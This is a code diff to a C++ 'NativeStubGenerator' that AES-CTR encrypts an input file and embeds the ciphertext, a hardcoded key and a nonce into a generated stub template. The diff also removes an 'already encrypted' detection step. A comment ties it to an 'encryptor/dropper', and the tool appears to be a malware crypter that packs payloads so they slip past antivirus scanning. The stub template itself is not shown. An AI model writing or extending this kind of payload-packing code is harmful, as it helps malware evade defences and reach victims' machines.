@@ -729,48 +729,29 @@ int main() {
         return ss.str();
     }
     
-    bool isFileEncrypted(const std::string& filename) {
-        std::ifstream file(filename, std::ios::binary);
-        if (!file.is_open()) return false;
-        
-        // Check if file is at least 16 bytes (nonce size)
-        file.seekg(0, std::ios::end);
-        size_t fileSize = file.tellg();
-        if (fileSize < 16) return false;
-        
-        // Read first 16 bytes and check if they look like a nonce
-        file.seekg(0, std::ios::beg);
-        uint8_t buffer[16];
-        if (!file.read(reinterpret_cast<char*>(buffer), 16)) return false;
-        
-        // Better heuristic: check if the first 16 bytes look like random data
-        // Plain text files typically have readable ASCII characters
-        // Encrypted files have more random-looking byte patterns
-        int printableCount = 0;
-        for (int i = 0; i < 16; i++) {
-            if (buffer[i] >= 32 && buffer[i] <= 126) { // Printable ASCII
-                printableCount++;
-            }
-        }
-        
-        // If more than 12 out of 16 bytes are printable ASCII, it's likely plain text
-        // If fewer than 8 are printable, it's likely encrypted
-        return printableCount < 8;
-    }
+
+
+public:
+    NativeStubGenerator() : rng(std::time(nullptr)) {}
     
-    std::vector<uint8_t> encryptFile(const std::string& filename) {
-        // Read the plain file
-        std::ifstream inFile(filename, std::ios::binary);
+    void generateStub(const std::string& inputFile, const std::string& outputFile, 
+                     const std::string& stubType = "basic", bool useRandomKey = true) {
+        
+        // Read input file
+        std::ifstream inFile(inputFile, std::ios::binary);
         if (!inFile.is_open()) {
-            throw std::runtime_error("Cannot open input file: " + filename);
+            std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
+            return;
         }
         
+        // Read the file data
         std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)),
                                     std::istreambuf_iterator<char>());
         inFile.close();
         
         if (fileData.empty()) {
-            throw std::runtime_error("Input file is empty");
+            std::cerr << "Error: Input file is empty" << std::endl;
+            return;
         }
         
         // Generate nonce
@@ -804,90 +785,6 @@ int main() {
         // Encrypt the data
         aesCtrCrypt(fileData.data(), fileData.size(), aesKey, nonce);
         
-        // Combine nonce + encrypted data
-        std::vector<uint8_t> result;
-        result.insert(result.end(), nonce, nonce + 16);
-        result.insert(result.end(), fileData.begin(), fileData.end());
-        
-        return result;
-    }
-
-public:
-    NativeStubGenerator() : rng(std::time(nullptr)) {}
-    
-    void generateStub(const std::string& inputFile, const std::string& outputFile, 
-                     const std::string& stubType = "basic", bool useRandomKey = true) {
-        
-        std::vector<uint8_t> encryptedData;
-        uint8_t nonce[16];
-        
-        // Check if file is already encrypted
-        if (isFileEncrypted(inputFile)) {
-            std::cout << "✓ File appears to be already encrypted, using as-is..." << std::endl;
-            
-            // Read input file (already encrypted)
-            std::ifstream inFile(inputFile, std::ios::binary);
-            if (!inFile.is_open()) {
-                std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
-                return;
-            }
-            
-            // Read the nonce from the beginning of the encrypted file
-            if (!inFile.read(reinterpret_cast<char*>(nonce), 16)) {
-                std::cerr << "Error: Cannot read nonce from encrypted file" << std::endl;
-                return;
-            }
-            
-            // Read the encrypted data
-            encryptedData = std::vector<uint8_t>((std::istreambuf_iterator<char>(inFile)),
-                                               std::istreambuf_iterator<char>());
-            inFile.close();
-            
-            if (encryptedData.empty()) {
-                std::cerr << "Error: No encrypted data found" << std::endl;
-                return;
-            }
-        } else {
-            std::cout << "✓ File appears to be plain, encrypting first..." << std::endl;
-            
-            try {
-                // Encrypt the plain file
-                encryptedData = encryptFile(inputFile);
-                
-                // Extract nonce from the beginning
-                std::copy(encryptedData.begin(), encryptedData.begin() + 16, nonce);
-                
-                // Remove nonce from encrypted data (stub will handle it separately)
-                encryptedData.erase(encryptedData.begin(), encryptedData.begin() + 16);
-                
-            } catch (const std::exception& e) {
-                std::cerr << "Error encrypting file: " << e.what() << std::endl;
-                return;
-            }
-        }
-        
-        // Use the same key system as encryptor/dropper (no obfuscation)
-        uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
-        constexpr size_t keyLen = sizeof(encKey);
-        
-        uint8_t key[keyLen];
-        const char* envKey = std::getenv("ENCRYPTION_KEY");
-        if (envKey && strlen(envKey) >= keyLen) {
-            for (size_t i = 0; i < keyLen; ++i) {
-                key[i] = static_cast<uint8_t>(envKey[i]);
-            }
-        } else {
-            for (size_t i = 0; i < keyLen; ++i) {
-                key[i] = encKey[i];
-            }
-        }
-        
-        // Prepare AES key (expand or truncate to 16 bytes)
-        uint8_t aesKey[16];
-        for (size_t i = 0; i < 16; ++i) {
-            aesKey[i] = key[i % keyLen];
-        }
-        
         // Convert to hex strings for stub
         std::string keyHex, nonceHex;
         for (int i = 0; i < 16; i++) {
@@ -897,6 +794,8 @@ public:
             sprintf(hex, "%02x", nonce[i]);
             nonceHex += hex;
         }
+        
+
         
         // Generate stub template
         std::string stubTemplate = generateStubTemplate(stubType);
@@ -934,7 +833,7 @@ public:
         // Replace embedded data
         pos = stubTemplate.find("{EMBEDDED_DATA}");
         if (pos != std::string::npos) {
-            stubTemplate.replace(pos, 15, embedDataAsArray(encryptedData));
+            stubTemplate.replace(pos, 15, embedDataAsArray(fileData));
         }
         
         // Replace key variable
@@ -963,8 +862,8 @@ public:
         std::cout << "  Input file: " << inputFile << std::endl;
         std::cout << "  Output stub: " << outputFile << std::endl;
         std::cout << "  Stub type: " << stubType << std::endl;
-        std::cout << "  Original size: " << encryptedData.size() << " bytes" << std::endl;
-        std::cout << "  Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
+        std::cout << "  Original size: " << fileData.size() << " bytes" << std::endl;
+        std::cout << "  Encrypted size: " << fileData.size() << " bytes" << std::endl;
         std::cout << "  Key: " << keyHex << std::endl;
         std::cout << "  Nonce: " << nonceHex << std::endl;
     }
